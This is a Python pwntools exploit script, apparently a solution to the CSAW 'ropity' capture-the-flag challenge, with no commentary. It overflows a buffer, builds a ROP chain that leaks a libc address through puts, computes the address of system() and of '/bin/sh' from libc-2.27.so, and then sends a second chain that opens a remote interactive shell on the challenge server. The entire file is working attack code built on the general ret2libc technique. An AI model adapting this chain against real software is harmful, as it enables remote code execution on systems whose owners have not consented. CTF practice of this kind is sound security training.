from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('ropity')

#io = process(elf.path)

io = remote("pwn.chal.csaw.io",5016)

junk = b"A"*40

rop = ROP(elf)

poprdi = (rop.find_gadget(['pop rdi','ret']))[0]

ret = (rop.find_gadget(['ret']))[0]

PUTS = elf.plt['puts']

MAIN = elf.symbols['__libc_start_main']

MAIN_PLT = elf.symbols['main']

payload = junk +p64(poprdi) + p64(MAIN) + p64(PUTS) + p64(elf.sym.main)

io.recv()

io.sendline(payload)

#received = str(io.recvline()).split("'")[1].split("\\n")[0]

leak = unpack(io.recvline(keepends=False),'all',endian='little',sign=False)

elf2 = ELF('libc-2.27.so')

elfmain = elf2.symbols['__libc_start_main']

elfsystem = elf2.symbols['__libc_system']

offset = elfsystem - elfmain

elf2.address = leak - elfmain

binsh = next(elf2.search(b'/bin/sh'))

print(hex(binsh))

systemaddr = leak + offset

io.recv()

io.sendline(junk + p64(ret) + p64(poprdi) + p64(binsh) + p64(systemaddr))

io.interactive()

